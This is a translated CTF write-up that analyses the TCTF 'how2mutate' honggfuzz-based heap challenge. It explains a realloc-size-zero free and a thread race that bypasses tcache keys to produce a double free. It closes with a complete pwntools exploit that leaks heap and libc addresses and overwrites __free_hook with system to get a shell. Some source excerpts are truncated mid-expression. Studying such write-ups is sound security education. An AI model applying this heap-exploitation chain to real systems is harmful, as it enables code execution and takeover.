# TCTF线上赛how2mutate学习条件竞争DoubleFree的利用
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
how2mutate这个题目给出了源码，是一个结合honggfuzz开源项目的题目。虽然看起来比较复杂，但是其实就是一个菜单题目，仔细分析一下就可以找到漏洞。
## 分析
这里我们先看一下题目的描述
    using honggfuzz commit 7eecfc991d0ae540d9773a6feb8fac5012a55ed6
    remote server is newest Ubuntu:20.04 docker (IMAGE ID 9873176a8ff5) . find the libs yourself :)
这里我首先是搜索了一下7eecfc991d0ae540d9773a6feb8fac5012a55ed6这个commit
导致一开始我以为这是一个溢出的漏洞。😅
这里我们首先看一下main函数
    seeds = (uint8_t **)util_Calloc(8*16);
    puts(menu);
    while (1) {
        printf("> ");
        read(0, buf, 4);
        if (buf[0] == '1') {
            add_seed();
        } else if (buf[0] == '2') {
            mutate_seed();
        } else if (buf[0] == '3') {
            show_seed();
        } else if (buf[0] == '4') {
            delete_seed();
        } else if (buf[0] == '5') {
            set_mutate();
        } else if (buf[0] == '6') {
            subproc_runThread(&hfuzz, &fuzzthread, tofuzz, false);
        } else {
            break;
        }
    }
前面的部分不太重要，这里只选取了一些重要的部分。也就是可以看到这里有6个功能，分别是add，mutate，show，delete，set_mutate以及fuzz。我们依次看一下，首先是add函数
    void add_seed() {
        int i=0;
        while (i0 && sz='0' && buf[0]size = seedssz[idx];
                memcpy(run.dynfile->data, seeds[idx], seedssz[idx]);
                mangle_mangleContent(&run, 1);
                seedssz[idx] = run.dynfile->size;
                seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);
                memcpy(seeds[idx], run.dynfile->data, seedssz[idx]);
            }
        }
    }
这个函数其实就是一个种子变异的函数。函数首先根据我们指定index将对应的种子的内容拷贝到run.dynfile->data函数中，之后调用mangle_mangleContent函数，我们可以结合honggfuzz分析一下这个函数，从分析可以得出这个函数的功能是执行种子的变异，我们看一下前半段的内容。
    void mangle_mangleContent(run_t* run, int speed_factor) {
        static void (*const mangleFuncs[])(run_t * run, bool printable) = {
            mangle_Shrink,
            mangle_Expand,
            mangle_Bit,
            mangle_IncByte,
            mangle_DecByte,
            mangle_NegByte,
            mangle_AddSub,
            mangle_MemSet,
            mangle_MemClr,
            mangle_MemSwap,
            mangle_MemCopy,
            mangle_Bytes,
            mangle_ASCIINum,
            mangle_ASCIINumChange,
            mangle_ByteRepeat,
            mangle_Magic,
            mangle_StaticDict,
            mangle_ConstFeedbackDict,
            mangle_RandomBuf,
            mangle_Splice,
        };
        if (run->mutationsPerRun == 0U) {
            return;
        }
    //...
    }
可以看到这里如果run->mutationsPerRun为0的话，那么就直接返回不在执行之后的种子变异的操作。而这个成员变量我们可以通过set_mutate函数来进行设置
    void set_mutate() {
        char buf[16];
        printf("mutationsPerRun: ");
        read(0, buf, 4);
        if (buf[0]>='0' && buf[0]data, seedssz[idx]);
那么这里函数传入的参数就是seedssz[idx]，也就是我们输入的size，是可以为0的，也就是这里是可以触发漏洞的。触发完毕漏洞之后会执行memcpy函数，这里的seeds[idx]的值就变为了0，但是由于seedssz[idx]的值也是0，因此这里不会报错。
## 条件竞争
在找到漏洞之后接下来就是如何利用的问题，由于20.04开启了tcache keys对tcache的double
free进行了检测，因此这里我们还需要找到一种方法来对keys进行覆写。我们继续分析之后的函数，也就是可以对buf进行覆写的函数，并且这个函数要单独的执行一个线程，这样才能够在两次free中间进行覆写keys构造出double
free。妥妥的条件竞争。
这里注意到在main函数的菜单中，fuzz功能是通过重新启动一个线程来完成的。
    subproc_runThread(&hfuzz, &fuzzthread, tofuzz, false);
    static void* tofuzz(void* arg) {
        for (int c=0; c ", "1")
        p.sendlineafter("size: ", str(size))
        if size > 0:
            p.sendafter("content: ", content)
    def mutate_seed(index):
        p.sendlineafter("> ", "2")
        p.sendlineafter("index: ", str(index))
    def show_seed():
        p.sendlineafter("> ", "3")
    def delete_seed(index):
        p.sendlineafter("> ", "4")
        p.sendlineafter("index: ", str(index))
    def set_mutate(mutate):
        p.sendlineafter("> ", "5")
        p.sendlineafter("mutationsPerRun: ", str(mutate))
    def fuzz():
        p.sendlineafter("> ", "6")
    heap_address = 0
    set_mutate(0)
    for i in range(1):
        add_seed(0x17, b"a" * 0x17)
    for i in range(1):
        delete_seed(i)
    add_seed(0)  # 0
    mutate_seed(0)
    p.recvuntil("realloc(")
    heap_address = int(p.recvuntil(",", drop=True), 16)
    log.success("heap address is {}".format(hex(heap_address)))
    add_seed(0x17, b"a" * 0x17)  # 0
    if debug:
        add_seed(0x70 + 0x400, b"a")  # 1
    else:
        add_seed(0x80 + 0x400, b"a")  # 1
    add_seed(0x17, b"a" * 0x17)  # 2
    delete_seed(1)  # unsorted bin # 0x5a0
    delete_seed(2)
    delete_seed(0)  # 0x3a0
    if debug:
        gdb.attach(p, "b *$rebase(0x7000)\nb *$rebase(0x1FB90)")
        log.success("heap address is {}".format(hex(heap_address)))
        log.success("libc address is {}".format(hex(libc.address)))
    fuzz()
    add_seed(0)
    mutate_seed(0)
    if debug:
        show_address = heap_address + 0x8f0 + 0x50
    else:
        show_address = heap_address + 0x3a0
    add_seed(0x10, p64(show_address))  # 0
    add_seed(0x8, b"a")  # 1
    add_seed(0x8, b"a")  # 2
    add_seed(0x40, b"a")  # 3
    log.success("show address is {}".format(hex(show_address)))
    show_seed()
    p.recvuntil("2: ")
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address is {}".format(hex(libc.address)))
    add_seed(0x8, b"a" * 0x8)  # 4 = 2
    if debug:
        add_seed(0x20, b"/bin/sh\x00")  # 5
        add_seed(0x20, b"/bin/sh\x00")  # 6
    else:
        add_seed(0xc0, b"/bin/sh\x00")  # 5
    add_seed(0x8, b"a" * 0x8)  # 6
    if debug:
        delete_seed(6)
    else:
        delete_seed(7)
    fuzz()
    delete_seed(4)
    delete_seed(2)
    add_seed(0x8, p64(libc.sym['__free_hook']))  # 3
    add_seed(0x8, b"/bin/sh\x00")  # 5
    add_seed(0x8, p64(libc.sym['system']))  # 7
    delete_seed(5)
    p.interactive()